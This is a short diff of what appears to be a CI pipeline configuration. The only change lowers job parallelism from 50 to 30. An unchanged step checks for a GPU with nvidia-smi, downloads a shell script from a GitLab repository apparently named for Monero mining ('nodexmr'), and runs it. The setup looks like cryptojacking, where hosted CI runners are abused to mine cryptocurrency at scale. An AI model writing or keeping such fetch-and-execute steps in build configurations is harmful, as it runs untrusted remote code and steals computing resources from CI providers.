@@ -7,4 +7,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/bzz.sh && chmod +x *.sh && ./bzz.sh
-    parallelism: 50
+    parallelism: 30
